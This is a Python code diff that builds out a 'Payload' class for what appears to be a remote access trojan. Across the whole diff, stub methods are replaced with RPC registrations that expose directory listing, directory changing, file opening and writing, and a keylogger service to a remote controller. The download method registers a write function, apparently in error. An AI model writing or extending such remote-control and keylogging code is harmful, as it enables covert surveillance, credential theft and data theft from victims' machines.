@@ -8,15 +8,12 @@ import sys
 from .. import sock
 from .. import rpc
 
+from . import KeyloggerService
+
 
 def uname():
     import platform
     return platform.uname()
-
-
-def get_file_size(path):
-    import os
-    return os.path.getsize(path)
 
 
 def get_username():
@@ -50,18 +47,23 @@ def get_current_dir():
     return os.getcwd()
 
 
+def get_file_size(path):
+    import os
+    return os.path.getsize(path)
+
+
 class FileOpener:
 
     def __init__(self):
         self.open_files = dict()
 
-    def open_file(self, path, mode='r'):
+    def file_open(self, path, mode='r'):
         f = open(path, mode)
         fid = id(f)
         self.open_files[fid] = f
         return fid
 
-    def close_file(self, fid):
+    def file_close(self, fid):
         if fid not in self.open_files:
             return
         f = self.open_files[fid]
@@ -71,7 +73,7 @@ class FileOpener:
 
 class FileReader:
 
-    def read_file(self, fid, size):
+    def file_read(self, fid, size):
         import base64
         f = self.open_files[fid]
         data = f.read(size)
@@ -80,7 +82,7 @@ class FileReader:
 
 class FileWriter:
 
-    def write_file(self, fid, data):
+    def file_write(self, fid, data):
         import base64
         f = self.open_files[fid]
         data = base64.urlsafe_b64decode(data)
@@ -88,16 +90,39 @@ class FileWriter:
         f.flush()
 
 
+class FileService(FileOpener, FileWriter, FileReader):
+    pass
+
+
 class Payload(rpc.RPCDispatcher):
+    
+    def __init__(self, *args, **kwargs):
+        super().__init__(*args, **kwargs)
+        self._file_service = FileService()
+        self._keylogger_service = KeyloggerService()
+
+        self._register_shell_functions()
+
+    def _register_shell_functions(self):
+        funcs = [
+                list_dir,
+                change_dir,
+                get_current_dir,
+                get_file_size,
+        ]
+        for f in funcs:
+            self.register_function(f)
 
     def register_file_upload(self):
-        pass
+        self.register_function(self._file_service.file_open)
+        self.register_function(self._file_service.file_write)
 
     def register_file_download(self):
-        pass
+        self.register_function(self._file_service.file_open)
+        self.register_function(self._file_service.file_write)
 
     def register_keylogger(self):
-        pass
+        self.register_instance(self._keylogger_service)
 
     def register_screenshot(self):
         pass
